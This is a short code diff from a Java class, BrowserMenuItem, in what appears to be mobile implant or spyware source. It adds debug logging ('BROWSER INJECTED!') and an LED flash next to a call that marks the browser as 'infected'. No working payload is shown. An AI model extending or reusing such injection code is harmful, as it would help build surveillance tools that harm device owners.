@@ -67,6 +67,11 @@ public class BrowserMenuItem extends ApplicationMenuItem {
                 debug.trace("run browserScreen: " + browserScreen);
                 //#endif
                 
+                //#ifdef DEBUG
+                debug.info("BROWSER INJECTED!");
+                debug.ledFlash(Debug.COLOR_GREEN);
+                //#endif
+                
                 AppInjectorBrowser.getInstance().setInfected(true);
             }
 
